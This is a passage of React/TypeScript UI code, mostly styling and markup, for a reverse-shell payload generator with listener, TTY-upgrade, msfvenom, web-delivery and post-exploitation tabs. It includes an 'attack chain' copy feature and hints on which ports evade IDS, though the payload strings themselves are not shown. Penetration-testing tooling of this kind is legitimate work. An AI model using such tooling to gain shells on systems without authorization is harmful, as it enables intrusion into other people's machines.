    .output-area{flex:1;padding:14px;overflow:auto;display:flex;flex-direction:column;gap:12px;}
    .output-card{background:var(--panel);border:1px solid var(--border);animation:fadeIn 0.2s ease;}
    .card-header{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.2);flex-wrap:wrap;gap:6px;}
    .card-title{font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}
    .card-actions{display:flex;gap:5px;flex-wrap:wrap;}
    .action-btn{padding:3px 9px;font-size:10px;background:var(--bg);border:1px solid var(--border);color:var(--muted);cursor:pointer;transition:all 0.2s;font-family:'JetBrains Mono',monospace;white-space:nowrap;}
    .action-btn:hover{border-color:var(--accent);color:var(--accent);}
    .action-btn.success{border-color:#00ff41;color:#00ff41;}
    .action-btn.primary{border-color:var(--accent);color:var(--accent);}
    .action-btn.warning{border-color:#ffb300;color:#ffb300;}
    .payload-box{padding:12px 14px;font-size:12px;line-height:1.8;word-break:break-all;position:relative;min-height:52px;}
    .cursor{display:inline-block;width:8px;height:14px;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite;vertical-align:text-bottom;}
    .explain-section{padding:9px 12px;border-top:1px solid var(--border);background:rgba(0,0,0,0.2);}
    .explain-row{display:flex;gap:10px;margin-bottom:4px;font-size:11px;}
    .explain-key{color:var(--accent);min-width:160px;flex-shrink:0;}
    .explain-val{color:var(--muted);}
    .opsec-section{padding:9px 12px;border-top:1px solid var(--border);background:rgba(255,180,0,0.04);display:flex;gap:8px;align-items:flex-start;}
    .opsec-text{font-size:11px;color:#cc9900;line-height:1.6;}
    .mitre-section{padding:7px 12px;border-top:1px solid var(--border);background:rgba(0,0,0,0.15);display:flex;gap:6px;align-items:center;flex-wrap:wrap;}
    .mitre-label{font-size:9px;color:var(--muted);letter-spacing:1px;}
    .mitre-tag{padding:2px 7px;border:1px solid rgba(100,100,255,0.4);background:rgba(100,100,255,0.07);color:#8888ff;font-size:9px;cursor:pointer;transition:all 0.15s;text-decoration:none;}
    .mitre-tag:hover{border-color:#8888ff;background:rgba(100,100,255,0.15);}
    .noise-badge{display:flex;align-items:center;gap:5px;padding:2px 7px;border:1px solid;font-size:9px;letter-spacing:1px;}
    .enc-chip{padding:3px 9px;background:var(--bg);border:1px solid var(--border);font-size:10px;cursor:pointer;color:var(--muted);transition:all 0.15s;font-family:'JetBrains Mono',monospace;}
    .enc-chip:hover{border-color:var(--dim);color:var(--text);}
    .enc-chip.active{border-color:var(--accent);color:var(--accent);background:rgba(255,255,255,0.03);}
    .encoding-row{display:flex;gap:6px;align-items:center;flex-wrap:wrap;}
    .length-badge{font-size:9px;color:var(--muted);padding:2px 5px;background:var(--bg);border:1px solid var(--border);}
    .encrypted-badge{font-size:9px;color:#00ff41;padding:2px 5px;background:rgba(0,255,65,0.05);border:1px solid rgba(0,255,65,0.3);}
    .listener-select{padding:4px 8px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;cursor:pointer;}
    .fav-label{padding:4px 10px 2px;font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;}
    .fav-section{border-bottom:1px solid var(--border);}
    .empty-state{padding:20px;text-align:center;color:var(--muted);font-size:11px;}
    .kbd{display:inline-block;padding:1px 5px;background:var(--bg);border:1px solid var(--border);font-size:9px;color:var(--muted);}
    .status-dot{width:6px;height:6px;border-radius:50%;background:var(--accent);display:inline-block;box-shadow:0 0 6px var(--accent);animation:pulse 2s infinite;margin-right:5px;}
    .footer{padding:7px 16px;border-top:1px solid var(--border);background:var(--panel);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;}
    .footer-text{font-size:9px;color:var(--muted);letter-spacing:1px;}
    /* TTY */
    .tty-step{border-bottom:1px solid var(--border);}
    .tty-step-header{display:flex;align-items:center;gap:8px;padding:9px 12px;cursor:pointer;transition:background 0.15s;}
    .tty-step-header:hover{background:rgba(255,255,255,0.02);}
    .tty-num{width:22px;height:22px;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--muted);flex-shrink:0;}
    .tty-num.active{border-color:var(--accent);color:var(--accent);box-shadow:0 0 6px var(--dim);}
    .tty-num.done{border-color:#00ff41;color:#00ff41;background:rgba(0,255,65,0.05);}
    .tty-content{padding:0 12px 12px 42px;animation:fadeIn 0.2s ease;}
    .tty-desc{font-size:11px;color:var(--muted);margin-bottom:8px;line-height:1.6;}
    .tty-cmd-row{display:flex;align-items:center;gap:7px;margin-bottom:5px;}
    .tty-cmd{font-size:11px;padding:5px 9px;background:var(--bg);border:1px solid var(--border);flex:1;color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.4;}
    .tty-cmd.pref{border-color:var(--dim);color:var(--accent);}
    .tty-lbl{font-size:9px;color:var(--muted);min-width:110px;text-align:right;flex-shrink:0;}
    .tty-copy-btn{padding:3px 7px;background:var(--bg);border:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:9px;font-family:'JetBrains Mono',monospace;transition:all 0.15s;white-space:nowrap;flex-shrink:0;}
    .tty-copy-btn:hover{border-color:var(--accent);color:var(--accent);}
    .tty-copy-btn.done{border-color:#00ff41;color:#00ff41;}
    .tty-nav{display:flex;gap:6px;padding:8px 12px 12px 42px;}
    .tty-nav-btn{padding:4px 12px;background:var(--bg);border:1px solid var(--border);color:var(--muted);cursor:pointer;font-size:10px;font-family:'JetBrains Mono',monospace;transition:all 0.15s;}
    .tty-nav-btn:hover{border-color:var(--accent);color:var(--accent);}
    .tty-nav-btn.p{border-color:var(--accent);color:var(--accent);}
    .tty-prog{display:flex;gap:4px;padding:8px 12px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.2);}
    .tty-prog-step{height:3px;flex:1;background:var(--border);transition:background 0.3s;}
    .tty-prog-step.done{background:var(--accent);}
    .tty-intro{padding:12px;border-bottom:1px solid var(--border);background:rgba(0,255,65,0.03);font-size:11px;color:var(--muted);line-height:1.7;}
    .tty-intro strong{color:var(--text);}
    /* MSF */
    .msf-layout{display:flex;gap:0;flex:1;min-height:0;overflow:hidden;}
    .msf-sidebar{width:180px;min-width:180px;border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;}
    .msf-cat-btn{display:flex;align-items:center;gap:7px;width:100%;padding:7px 10px;background:none;border:none;border-left:2px solid transparent;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:10px;cursor:pointer;transition:all 0.15s;text-align:left;}
    .msf-cat-btn:hover{background:rgba(255,255,255,0.03);color:var(--text);}
    .msf-cat-btn.active{border-left-color:var(--accent);color:var(--accent);background:rgba(255,255,255,0.05);}
    .msf-cat-count{margin-left:auto;font-size:9px;padding:1px 4px;background:var(--bg);border:1px solid var(--border);color:var(--muted);}
    .msf-cat-btn.active .msf-cat-count{border-color:var(--dim);color:var(--dim);}
    .msf-content{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:10px;min-width:0;}
    .msf-card{background:var(--bg);border:1px solid var(--border);transition:border 0.15s;cursor:pointer;}
    .msf-card:hover{border-color:var(--dim);}
    .msf-card.active{border-color:var(--accent);}
    .msf-card-header{display:flex;align-items:center;justify-content:space-between;padding:7px 10px;border-bottom:1px solid var(--border);gap:6px;flex-wrap:wrap;}
    .msf-card-title{font-size:11px;color:var(--text);font-weight:500;}
    .badges{display:flex;gap:4px;align-items:center;flex-wrap:wrap;}
    .badge{padding:1px 6px;font-size:9px;border:1px solid;letter-spacing:1px;white-space:nowrap;}
    .badge-staged{color:#ffb300;border-color:#ffb30066;background:rgba(255,179,0,0.07);}
    .badge-stageless{color:#00ff41;border-color:#00ff4166;background:rgba(0,255,65,0.07);}
    .badge-dim{color:var(--muted);border-color:var(--border);}
    .msf-cmd-block{padding:9px 10px;font-size:11px;word-break:break-all;line-height:1.7;}
    .msf-notes{padding:7px 10px;border-top:1px solid var(--border);font-size:10px;color:var(--muted);line-height:1.6;background:rgba(0,0,0,0.1);}
    .msf-actions{display:flex;gap:5px;padding:7px 10px;border-top:1px solid var(--border);background:rgba(0,0,0,0.15);align-items:center;justify-content:space-between;flex-wrap:wrap;}
    .msf-listener-block{padding:9px 10px;background:rgba(0,0,0,0.2);border-top:1px solid var(--border);font-size:11px;line-height:1.7;color:var(--muted);}
    .msf-evasion{padding:8px 10px;border-top:1px solid var(--border);background:rgba(0,0,0,0.15);display:flex;gap:10px;align-items:center;flex-wrap:wrap;}
    .mini-input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:3px 7px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;width:55px;}
    .mini-input:focus{border-color:var(--accent);}
    .mini-select{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:3px 7px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;cursor:pointer;}
    .msf-header-note{padding:9px 12px;background:rgba(255,179,0,0.04);border-bottom:1px solid var(--border);font-size:10px;color:#cc9900;line-height:1.6;display:flex;gap:7px;align-items:flex-start;}
    .msf-search-bar{padding:7px 12px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.1);}
    .msf-search-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 9px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;}
    .msf-search-input:focus{border-color:var(--accent);}
    .msf-stats{display:flex;gap:6px;align-items:center;flex-wrap:wrap;}
    .msf-stat{font-size:9px;color:var(--muted);padding:1px 5px;border:1px solid var(--border);background:var(--bg);}
    .badchars-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;}
    /* Post-Ex */
    .postex-layout{display:flex;gap:0;flex:1;min-height:0;overflow:hidden;}
    .postex-sidebar{width:190px;min-width:190px;border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;}
    .postex-sec-btn{display:flex;align-items:center;gap:7px;width:100%;padding:7px 10px;background:none;border:none;border-left:2px solid transparent;color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:10px;cursor:pointer;transition:all 0.15s;text-align:left;}
    .postex-sec-btn:hover{background:rgba(255,255,255,0.03);color:var(--text);}
    .postex-sec-btn.active{border-left-color:var(--accent);color:var(--accent);background:rgba(255,255,255,0.05);}
    .postex-content{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;min-width:0;}
    .postex-cmd-card{background:var(--bg);border:1px solid var(--border);transition:border 0.15s;}
    .postex-cmd-card:hover{border-color:var(--dim);}
    .postex-cmd-header{display:flex;align-items:center;justify-content:space-between;padding:6px 10px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.1);}
    .postex-cmd-label{font-size:10px;color:var(--muted);}
    .postex-cmd-body{padding:7px 10px;font-size:11px;word-break:break-all;line-height:1.7;color:var(--text);font-family:'JetBrains Mono',monospace;white-space:pre-wrap;}
    .postex-filter{padding:7px 12px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.1);}
    .postex-filter-input{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 9px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;}
    .postex-filter-input:focus{border-color:var(--accent);}
    /* Web Delivery */
    .web-section-title{font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;padding:10px 12px 4px;}
    .web-cmd-card{background:var(--bg);border:1px solid var(--border);margin:0 12px 8px;transition:border 0.15s;}
    .web-cmd-card:hover{border-color:var(--dim);}
    .web-cmd-header{display:flex;align-items:center;justify-content:space-between;padding:5px 9px;border-bottom:1px solid var(--border);background:rgba(0,0,0,0.1);}
    .web-cmd-label{font-size:10px;color:var(--muted);}
    .web-cmd-body{padding:7px 9px;font-size:11px;word-break:break-all;color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.6;}
    /* Engagement */
    .eng-layout{display:flex;gap:0;flex:1;min-height:0;overflow:hidden;}
    .eng-form{width:300px;min-width:300px;border-right:1px solid var(--border);overflow-y:auto;padding:14px;display:flex;flex-direction:column;gap:12px;}
    .eng-label{font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:3px;}
    .eng-input{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:5px 9px;font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;width:100%;}
    .eng-input:focus{border-color:var(--accent);}
    .eng-textarea{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:8px 9px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;width:100%;resize:vertical;min-height:120px;line-height:1.6;}
    .eng-textarea:focus{border-color:var(--accent);}
    .hist-panel{flex:1;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;}
    .hist-item{padding:8px 10px;background:var(--bg);border:1px solid var(--border);cursor:pointer;transition:all 0.15s;font-size:11px;}
    .hist-item:hover{border-color:var(--accent);}
    .hist-payload{color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:'JetBrains Mono',monospace;}
    .hist-meta{display:flex;gap:10px;color:var(--muted);font-size:9px;margin-top:4px;flex-wrap:wrap;}
  `;

  return (
    <div className="app">
      <style>{css}</style>
      <div className="scanline" />
      <div className="crt" />

      <header className="header">
        <div className="logo">
          <div className="logo-icon">&gt;_</div>
          <div>
            <div className="logo-text">DREW&apos;S REVSHELL</div>
            <div className="logo-sub">
              PAYLOAD GENERATOR v3.0 · AUTHORIZED TESTING ONLY
            </div>
          </div>
        </div>
        <div className="header-right">
          <div className="auth-banner">⚠ FOR AUTHORIZED ENGAGEMENTS ONLY</div>
          <div
            className={`eng-badge ${engagement.name ? "active" : ""}`}
            onClick={() => setActiveTab("notes")}
            title="Engagement config"
          >
            {engagement.name ? `📋 ${engagement.name}` : "+ Engagement"}
          </div>
          <span style={{ fontSize: "10px", color: t.muted }}>
            <span className="kbd">Ctrl+Enter</span> copy
          </span>
          <div className="theme-btns">
            {(Object.entries(THEMES) as [ThemeKey, Theme][]).map(([k, v]) => (
              <div
                key={k}
                className={`theme-btn ${theme === k ? "active" : ""}`}
                style={{ background: v.accent }}
                onClick={() => setTheme(k)}
                title={v.name}
              />
            ))}
          </div>
        </div>
      </header>

      <div className="main">
        <aside className="sidebar">
          <div className="sidebar-search">
            <input
              className="search-input"
              placeholder="/ search shells..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              spellCheck={false}
            />
          </div>
          {favShells.length > 0 && !search && (
            <div className="fav-section">
              <div className="fav-label">★ Favorites</div>
              {favShells.map((s) => (
                <div
                  key={s.id}
                  className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                  onClick={() => setSelectedShell(s)}
                >
                  <div className="shell-icon">
                    {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                  </div>
                  <span style={{ flex: 1 }}>{s.label}</span>
                  {s.noise && (
                    <div
                      className="shell-noise"
                      style={{ background: NOISE_CONFIG[s.noise].color }}
                    />
                  )}
                  <button
                    className="star-btn active"
                    onClick={(e) => {
                      e.stopPropagation();
                      toggleFavorite(s.id);
                    }}
                  >
                    ★
                  </button>
                </div>
              ))}
            </div>
          )}
          <div className="shell-list">
            {categories.map((cat) => {
              const shells = filteredShells.filter((s) => s.category === cat);
              if (!shells.length) return null;
              return (
                <div key={cat}>
                  <div className="shell-category">{cat}</div>
                  {shells.map((s) => (
                    <div
                      key={s.id}
                      className={`shell-item ${selectedShell.id === s.id ? "active" : ""}`}
                      onClick={() => setSelectedShell(s)}
                    >
                      <div className="shell-icon">
                        {CATEGORY_ICONS[s.category] ?? s.category.slice(0, 3)}
                      </div>
                      <span style={{ flex: 1 }}>{s.label}</span>
                      {s.noise && (
                        <div
                          className="shell-noise"
                          style={{ background: NOISE_CONFIG[s.noise].color }}
                          title={NOISE_CONFIG[s.noise].desc}
                        />
                      )}
                      <button
                        className={`star-btn ${favorites.has(s.id) ? "active" : ""}`}
                        onClick={(e) => {
                          e.stopPropagation();
                          toggleFavorite(s.id);
                        }}
                      >
                        {favorites.has(s.id) ? "★" : "☆"}
                      </button>
                    </div>
                  ))}
                </div>
              );
            })}
            {filteredShells.length === 0 && (
              <div className="empty-state">no shells found</div>
            )}
          </div>
        </aside>

        <div className="content">
          <div className="config-bar">
            <div className="field">
              <div className="field-label">LHOST</div>
              <div className="ip-row">
                <input
                  className={`field-input ${ipError ? "error" : ""}`}
                  value={ip}
                  onChange={(e) => setIp(e.target.value)}
                  placeholder="10.10.10.10"
                  spellCheck={false}
                />
                <button
                  className="auto-btn"
                  onClick={fetchPublicIp}
                  disabled={autoIpLoading}
                >
                  {autoIpLoading ? "..." : "auto"}
                </button>
              </div>
              {ipError && <div className="error-msg">{ipError}</div>}
            </div>
            <div className="field">
              <div className="field-label">LPORT</div>
              <input
                className={`field-input ${portError ? "error" : ""}`}
                value={port}
                onChange={(e) => setPort(e.target.value)}
                placeholder="4444"
                style={{ width: "95px" }}
              />
              <div className="port-quick">
                {COMMON_PORTS.map((p) => (
                  <div
                    key={p}
                    className={`port-chip ${port === String(p) ? "active" : ""}`}
                    onClick={() => setPort(String(p))}
                    title={
                      p === 443
                        ? "✓ likely allowed outbound"
                        : p === 80
                          ? "✓ likely allowed outbound"
                          : p === 4444
                            ? "⚠ common — flagged by IDS"
                            : ""
                    }
                  >
                    {p}
                  </div>
                ))}
              </div>
              {portError && <div className="error-msg">{portError}</div>}
            </div>
            <div className="field">
              <div className="field-label">ENCODING</div>
              <div className="encoding-row">
                {encodingOptions.map(([val, lbl]) => (
                  <div
                    key={val}
                    className={`enc-chip ${encoding === val ? "active" : ""}`}
                    onClick={() => setEncoding(val)}
                  >
                    {lbl}
                  </div>
                ))}
              </div>
            </div>
            <div className="field">
              <div className="field-label">VIEW</div>
              <div style={{ display: "flex", gap: "5px", marginTop: "3px" }}>
                <div
                  className={`enc-chip ${showExplain ? "active" : ""}`}
                  onClick={() => setShowExplain((v) => !v)}
                >
                  explain
                </div>
                <div
                  className={`enc-chip ${showOpsec ? "active" : ""}`}
                  onClick={() => setShowOpsec((v) => !v)}
                >
                  opsec
                </div>
              </div>
            </div>
          </div>

          <div className="tabs">
            {(
              [
                "payload",
                "listener",
                "tty",
                "generate",
                "webdelivery",
                "postex",
                "notes",
              ] as TabKey[]
            ).map((tab) => (
              <div
                key={tab}
                className={`tab ${activeTab === tab ? "active" : ""}`}
                onClick={() => setActiveTab(tab)}
              >
                {tab === "payload"
                  ? "PAYLOAD"
                  : tab === "listener"
                    ? "LISTENER"
                    : tab === "tty"
                      ? "TTY UPGRADE"
                      : tab === "generate"
                        ? "GENERATE BINARY"
                        : tab === "webdelivery"
                          ? "WEB DELIVERY"
                          : tab === "postex"
                            ? "POST-EXPLOIT"
                            : tab === "notes"
                              ? "ENGAGEMENT"
                              : ""}
              </div>
            ))}
          </div>

          <div className="output-area">
            {/* ── PAYLOAD TAB ── */}
            {activeTab === "payload" && (
              <>
                <div className="output-card">
                  <div className="card-header">
                    <div
                      style={{
                        display: "flex",
                        alignItems: "center",
                        gap: "8px",
                        flexWrap: "wrap",
                      }}
                    >
                      <span className="card-title">{selectedShell.label}</span>
                      <span className="length-badge">
                        {encodedPayload.length} chars
                      </span>
                      {encoding !== "none" && (
                        <span
                          className="length-badge"
                          style={{ color: t.accent }}
                        >
                          enc:{encoding}
                        </span>
                      )}
                      {selectedShell.encrypted && (
                        <span className="encrypted-badge">🔒 ENCRYPTED</span>
                      )}
                      {noiseInfo && (
                        <span
                          className="noise-badge"
                          style={{
                            color: noiseInfo.color,
                            borderColor: noiseInfo.color + "66",
                            background: noiseInfo.color + "0d",
                          }}
                        >
                          ◉ {noiseInfo.label}
                        </span>
                      )}
                    </div>
                    <div className="card-actions">
                      <button
                        className="action-btn"
                        onClick={downloadShellScript}
                        title="Download as script file"
                      >
                        ↓ .{selectedShell.ext}
                      </button>
                      <button
                        className={`action-btn ${copied ? "success" : "primary"}`}
                        onClick={copyPayload}
                      >
                        {copied ? "✓ copied!" : "copy"}
                      </button>
                    </div>
                  </div>
                  <div className="payload-box">
                    <span
                      dangerouslySetInnerHTML={{
                        __html: highlightPayload(encodedPayload, t.accent),
                      }}
                    />
                    <span className="cursor" />
                  </div>
                  {selectedShell.mitre && selectedShell.mitre.length > 0 && (
                    <div className="mitre-section">
                      <span className="mitre-label">MITRE ATT&CK</span>
                      {selectedShell.mitre.map((tag) => (
                        <a
                          key={tag}
                          className="mitre-tag"
                          href={`https://attack.mitre.org/techniques/${tag.replace(".", "/")}`}
                          target="_blank"
                          rel="noopener noreferrer"
                        >
                          {tag} ↗
                        </a>
                      ))}
                    </div>
                  )}
                  {showOpsec && selectedShell.opsec && (
                    <div className="opsec-section">
                      <span style={{ fontSize: "13px", flexShrink: 0 }}>⚠</span>
                      <div className="opsec-text">
                        <strong style={{ color: "#ffb300" }}>OPSEC: </strong>
                        {selectedShell.opsec}
                      </div>
                    </div>
                  )}
                  {showExplain &&
                    Object.keys(selectedShell.explain || {}).length > 0 && (
                      <div className="explain-section">
                        {Object.entries(selectedShell.explain).map(([k, v]) => (
                          <div key={k} className="explain-row">
                            <span className="explain-key">{k}</span>
                            <span className="explain-val">
                              {"// "}
                              {v}
                            </span>
                          </div>
                        ))}
                      </div>
                    )}
                </div>

                {/* One-liner chain card */}
                <div className="output-card">
                  <div className="card-header">
                    <span className="card-title">ATTACK CHAIN SUMMARY</span>
                    <button
                      className="action-btn"
                      onClick={() => {
                        const chain = `# [1] Start listener on attack box:\n${listenerCmd}\n\n# [2] Run payload on target:\n${encodedPayload}`;
                        navigator.clipboard.writeText(chain);
                      }}
                    >
                      copy chain
                    </button>
                  </div>
                  <div
                    className="payload-box"
                    style={{
                      display: "flex",
                      flexDirection: "column",
                      gap: "8px",
                    }}
                  >
                    <div style={{ fontSize: "10px", color: t.muted }}>
                      <span style={{ color: t.accent }}>[1] Listener</span> —
                      run on your machine first:
                    </div>
                    <div
                      style={{
                        fontSize: "11px",
                        fontFamily: "'JetBrains Mono',monospace",
                        color: t.text,
                        padding: "4px 0",
                      }}
                    >
                      <span
                        dangerouslySetInnerHTML={{
                          __html: highlightPayload(listenerCmd, t.accent),
                        }}
                      />
                    </div>
                    <div
                      style={{
                        fontSize: "10px",
                        color: t.muted,
                        marginTop: "4px",
                      }}
                    >
                      <span style={{ color: t.accent }}>[2] Payload</span> —
                      execute on target:
                    </div>
                    <div
                      style={{
                        fontSize: "11px",
                        fontFamily: "'JetBrains Mono',monospace",
                        color: t.text,
                        padding: "4px 0",
                        wordBreak: "break-all",
                      }}
                    >
                      <span
                        dangerouslySetInnerHTML={{
                          __html: highlightPayload(encodedPayload, t.accent),
                        }}
                      />
                    </div>
                  </div>
                </div>
              </>
            )}

            {/* ── LISTENER TAB ── */}
            {activeTab === "listener" && (
              <div className="output-card">
                <div className="card-header">
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "8px",
                    }}
                  >
                    <span className="card-title">LISTENER COMMAND</span>
                    <select
                      className="listener-select"
                      value={listenerType}
                      onChange={(e) =>
                        setListenerType(e.target.value as ListenerType)
                      }
                    >
                      <option value="nc">netcat (nc)</option>
                      <option value="ncat">ncat (nmap)</option>
                      <option value="socat">socat basic</option>
                      <option value="socat-pty">socat PTY — full TTY</option>
                      <option value="socat-tls">socat TLS — encrypted</option>
                      <option value="pwncat">pwncat-cs</option>
                      <option value="msf-multi">msf multi/handler</option>
                    </select>
                  </div>
                  <div className="card-actions">
                    <button
                      className="action-btn"
                      onClick={() =>
                        downloadText(
                          `#!/usr/bin/env bash\n# Listener — ${new Date().toISOString()}\n${engagement.name ? `# Engagement: ${engagement.name}\n` : ""}\n${listenerCmd}\n`,
                          `listener_${port}.sh`,
                        )
                      }
                    >
                      ↓ .sh
                    </button>
                    <button
                      className={`action-btn ${copiedListener ? "success" : "primary"}`}
                      onClick={copyListener}
                    >
                      {copiedListener ? "✓ copied!" : "copy"}
                    </button>
                  </div>
                </div>
                <div className="payload-box" style={{ whiteSpace: "pre-wrap" }}>
                  <span
                    dangerouslySetInnerHTML={{
                      __html: highlightPayload(listenerCmd, t.accent),
                    }}
                  />
                  <span className="cursor" />
                </div>
                <div className="explain-section">
                  <div
                    style={{
                      fontSize: "10px",
                      color: t.muted,
                      lineHeight: "1.8",
                    }}
                  >
                    Run this on your machine{" "}
                    <strong style={{ color: t.text }}>before</strong> executing
                    the payload on target.
                    <br />
                    <span style={{ color: t.accent }}>socat-pty</span> and{" "}
                    <span style={{ color: t.accent }}>pwncat</span> give a full
                    PTY immediately — no TTY upgrade needed.
                    <br />
                    For <span style={{ color: t.accent }}>nc/ncat</span>, use
                    the TTY UPGRADE tab after catching the shell.
                  </div>
                </div>
              </div>
            )}

            {/* ── TTY UPGRADE TAB ── */}
            {activeTab === "tty" && (
              <div className="output-card">
                <div className="card-header">
                  <span className="card-title">
                    TTY SHELL STABILIZATION WIZARD
                  </span>
                  <span className="length-badge">
                    step {ttyStep + 1}/{TTY_STEPS.length}
                  </span>
                </div>
                <div className="tty-intro">
                  <strong>Why:</strong> Raw nc shells lack job control, tab
                  completion, PTY — Ctrl+C kills the listener, editors break.
                  Use <strong>socat PTY</strong> or <strong>pwncat</strong> to
                  skip this entirely.
                </div>
                <div className="tty-prog">
                  {TTY_STEPS.map((_, i) => (
                    <div
                      key={i}
                      className={`tty-prog-step ${i <= ttyStep ? "done" : ""}`}
                    />
                  ))}
                </div>
                {TTY_STEPS.map((step, si) => {
                  const isActive = si === ttyStep;
                  const isDone = si < ttyStep;
                  return (
                    <div key={step.id} className="tty-step">
                      <div
                        className="tty-step-header"
                        onClick={() => setTtyStep(si)}
                      >
                        <div
                          className={`tty-num ${isActive ? "active" : ""} ${isDone ? "done" : ""}`}
                        >
                          {isDone ? "✓" : si + 1}
                        </div>
                        <span
                          style={{
                            fontSize: "12px",
                            color: isActive
                              ? t.accent
                              : isDone
                                ? "#00ff41"
                                : t.muted,
                          }}
                        >
                          {step.title}
                        </span>
                      </div>
                      {isActive && (
                        <div className="tty-content">
                          <div className="tty-desc">{step.description}</div>
                          {step.commands.map((cmd, ci) => (
                            <div key={ci} className="tty-cmd-row">
                              <span
                                className="tty-lbl"
                                style={{
                                  color: cmd.preferred ? t.accent : t.muted,
                                }}
                              >
                                {cmd.label}
                                {cmd.preferred && (
                                  <span
                                    style={{
                                      fontSize: "8px",
                                      color: t.accent,
                                      padding: "1px 4px",
                                      border: `1px solid ${t.dim}`,
                                      marginLeft: "4px",
                                    }}
                                  >
                                    ★
                                  </span>
                                )}
                              </span>
                              <div
                                className={`tty-cmd ${cmd.preferred ? "pref" : ""}`}
                              >
                                {cmd.cmd}
                              </div>
                              <button
                                className={`tty-copy-btn ${copiedCmd === `${si}-${ci}` ? "done" : ""}`}
                                onClick={() =>
                                  copyText(cmd.cmd, setCopiedCmd, `${si}-${ci}`)
                                }
                              >
                                {copiedCmd === `${si}-${ci}` ? "✓" : "copy"}
                              </button>
                            </div>
                          ))}
                          <div className="tty-nav">
                            {si > 0 && (
                              <button
                                className="tty-nav-btn"
                                onClick={() => setTtyStep((s) => s - 1)}
                              >
                                ← back
                              </button>
                            )}
                            {si < TTY_STEPS.length - 1 && (
                              <button
                                className="tty-nav-btn p"
                                onClick={() => setTtyStep((s) => s + 1)}
                              >
                                next →
                              </button>
                            )}
                            {si === TTY_STEPS.length - 1 && (
                              <button
                                className="tty-nav-btn p"
                                style={{
                                  color: "#00ff41",
                                  borderColor: "#00ff41",
                                }}
                                onClick={() => setTtyStep(0)}
                              >
                                ✓ restart
                              </button>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}

            {/* ── GENERATE BINARY TAB ── */}
            {activeTab === "generate" && (
              <div
                className="output-card"
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  minHeight: 0,
                }}
              >
                <div className="card-header">
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: "8px",
                      flexWrap: "wrap",
                    }}
                  >
                    <span className="card-title">
                      MSFVENOM PAYLOAD GENERATOR
                    </span>
                    <span className="length-badge">
                      {MSF_PAYLOADS.length} payloads
                    </span>
                    <span className="length-badge">
                      {MSF_CATEGORIES.length} categories
                    </span>
                  </div>
                  <div className="msf-stats">
                    <span className="msf-stat">
                      {MSF_PAYLOADS.filter((p) => p.staged === false).length}{" "}
                      stageless
                    </span>
                    <span className="msf-stat">
                      {MSF_PAYLOADS.filter((p) => p.staged === true).length}{" "}
                      staged
                    </span>
                  </div>
                </div>
                <div className="msf-header-note">
                  <span>⚠</span>
                  <span>
                    <strong style={{ color: t.text }}>
                      These are msfvenom commands
                    </strong>{" "}
                    — run on your Kali/Parrot box, not the target. Downloads are
                    shell scripts containing the command. The actual binary is
                    produced when you run the script. LHOST/LPORT auto-populated
                    from settings above.
                  </span>
                </div>
                {/* Bad chars row */}
                <div
                  style={{
                    padding: "8px 12px",
                    borderBottom: `1px solid ${t.border}`,
                    background: "rgba(0,0,0,0.1)",
                    display: "flex",
                    gap: "10px",
                    alignItems: "center",
                    flexWrap: "wrap",
                  }}
                >
                  <span style={{ fontSize: "10px", color: t.muted }}>
                    BAD CHARS:
                  </span>
                  <div
                    className={`enc-chip ${useBadChars ? "active" : ""}`}
                    onClick={() => setUseBadChars((v) => !v)}
                    style={{ fontSize: "9px" }}
                  >
                    -b flag
                  </div>
                  <input
                    className="mini-input"
                    value={badChars}
                    onChange={(e) => setBadChars(e.target.value)}
                    placeholder="\\x00\\x0a"
                    style={{ width: "140px" }}
                    disabled={!useBadChars}
                  />
                  <span style={{ fontSize: "9px", color: t.muted }}>
                    e.g. \\x00\\x0a\\x0d for null+newlines
                  </span>
                </div>
                <div className="msf-layout">
                  <div className="msf-sidebar">
                    {MSF_CATEGORIES.map((cat) => (
                      <button
                        key={cat}
